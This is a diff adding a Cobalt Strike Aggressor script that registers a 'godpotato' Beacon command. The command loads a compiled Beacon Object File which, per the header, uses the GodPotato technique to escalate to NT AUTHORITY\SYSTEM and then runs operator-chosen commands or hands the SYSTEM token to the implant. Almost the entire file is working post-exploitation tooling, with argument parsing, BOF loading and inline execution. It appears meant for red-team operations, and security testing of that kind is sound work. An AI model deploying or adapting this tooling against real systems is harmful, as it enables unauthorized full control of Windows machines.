@@ -1,0 +1,180 @@
+# GodPotato BOF - Potato privilege escalation (BeichenDream/GodPotato)
+# Requires ImpersonatePrivilege. Elevates to NT AUTHORITY\SYSTEM and runs a command.
+
+beacon_command_register(
+    "godpotato",
+    "GodPotato BOF - elevate to SYSTEM and run a command or impersonate Beacon",
+    "Use: godpotato [token] [-cmd <command>] [-pipe <name>]
+    Argument       Description
+    (none)         Run \"cmd /c whoami\" as SYSTEM.
+    token          Apply a SYSTEM token to the current Beacon with BeaconUseToken().
+    -cmd <cmd>     Run a command as SYSTEM in a spawned process.
+    -pipe <name>   Use a custom named pipe. Default is a random pipe name.
+
+Examples:
+    godpotato
+    godpotato token
+    godpotato help
+    godpotato -cmd \"cmd /c whoami /priv\"
+    godpotato -cmd \"cmd /c dir\"
+    godpotato -cmd \"cmd /c whoami\" -pipe \"mycustompipe\""
+);
+
+alias godpotato {
+    local('$bid $barch $handle $data $args $path $cmd $pipe $i $arg $usage $use_token $has_cmd $saw_token $saw_cmd');
+    $bid = $1;
+    $cmd = "cmd /c whoami";
+    $pipe = "";
+    $use_token = 0;
+    $has_cmd = 0;
+    $saw_token = 0;
+    $saw_cmd = 0;
+    $usage = "============================================================================================
+Use: godpotato [token] [-cmd <command>] [-pipe <name>]
+Argument       Description
+(none)         Run \"cmd /c whoami\" as SYSTEM.
+token          Apply a SYSTEM token to the current Beacon with BeaconUseToken().
+-cmd <cmd>     Run a command as SYSTEM in a spawned process.
+-pipe <name>   Use a custom named pipe. Default is a random pipe name.
+help,-h,--help,/?  Show this help.
+
+Examples:
+godpotato
+godpotato token
+godpotato help
+godpotato -cmd \"cmd /c whoami /priv\"
+godpotato -cmd \"cmd /c dir\"
+godpotato -cmd \"cmd /c whoami\" -pipe \"mycustompipe\"
+============================================================================================";
+
+    $i = 2;
+    while ($i <= size(@_)) {
+        $arg = @_[$i - 1];
+        if ($arg is $null || strlen($arg) == 0) {
+            $i++;
+            continue;
+        }
+        if ($arg eq "-pipe") {
+            $i += 2;
+            continue;
+        }
+        if (strlen($arg) > 6 && substr($arg, 0, 6) eq "-pipe ") {
+            $i++;
+            continue;
+        }
+        if ($arg eq "token") {
+            $saw_token = 1;
+        }
+        if ($arg eq "-cmd" || (strlen($arg) > 5 && substr($arg, 0, 5) eq "-cmd ")) {
+            $saw_cmd = 1;
+        }
+        $i++;
+    }
+    if ($saw_token && $saw_cmd) {
+        berror($bid, $usage);
+        return;
+    }
+
+    $i = 2;
+    while ($i <= size(@_)) {
+        $arg = @_[$i - 1];
+        if ($arg is $null || strlen($arg) == 0) {
+            $i++;
+            continue;
+        }
+        if ($arg eq "help" || $arg eq "-h" || $arg eq "--help" || $arg eq "/?") {
+            berror($bid, $usage);
+            return;
+        }
+        if ($arg eq "token") {
+            if ($has_cmd) {
+                berror($bid, $usage);
+                return;
+            }
+            $use_token = 1;
+            $cmd = "token";
+            $i++;
+            continue;
+        }
+        if (strlen($arg) > 6 && substr($arg, 0, 6) eq "-pipe ") {
+            $pipe = substr($arg, 6);
+            $i++;
+            continue;
+        }
+        if (strlen($arg) > 5 && substr($arg, 0, 5) eq "-cmd ") {
+            if ($use_token) {
+                berror($bid, $usage);
+                return;
+            }
+            $cmd = substr($arg, 5);
+            $has_cmd = 1;
+            $i++;
+            continue;
+        }
+        if ($arg eq "-cmd") {
+            if ($use_token) {
+                berror($bid, $usage);
+                return;
+            }
+            $i++;
+            if ($i <= size(@_)) {
+                $cmd = @_[$i - 1];
+                $has_cmd = 1;
+                $i++;
+                while ($i <= size(@_)) {
+                    $arg = @_[$i - 1];
+                    if ($arg eq "-pipe") {
+                        break;
+                    }
+                    if ($arg !is $null && strlen($arg) > 0) {
+                        $cmd = $cmd . " " . $arg;
+                    }
+                    $i++;
+                }
+            }
+            continue;
+        }
+        if ($arg eq "-pipe") {
+            $i++;
+            if ($i <= size(@_)) {
+                $pipe = @_[$i - 1];
+            }
+            $i++;
+            continue;
+        }
+        berror($bid, "Unknown argument: " . $arg . "\n" . $usage);
+        return;
+    }
+
+    # Figure out the arch of this session
+    $barch = barch($bid);
+
+    # Read in the right BOF file from the script directory, then fall back
+    # to the known-good absolute path used for manual inline-execute.
+    $path = script_resource("dist/BOF." . $barch . ".o");
+    $handle = openf($path);
+    if ($handle !is $null) {
+        $data = readb($handle, -1);
+        closef($handle);
+    }
+    if ($data is $null) {
+        $path = "/root/Desktop/Codidi/Potato/GodPotatoBOF/dist/BOF." . $barch . ".o";
+        $handle = openf($path);
+        if ($handle !is $null) {
+            $data = readb($handle, -1);
+            closef($handle);
+        }
+    }
+    if ($data is $null) {
+        berror($bid, "Failed to read BOF object: " . $path);
+        return;
+    }
+
+    $args = bof_pack($bid, "zz", $cmd, $pipe);
+
+    # Announce what we're doing
+    btask($bid, "Starting BOF...");
+
+    # Execute it
+    beacon_inline_execute($bid, $data, "go", $args);
+}
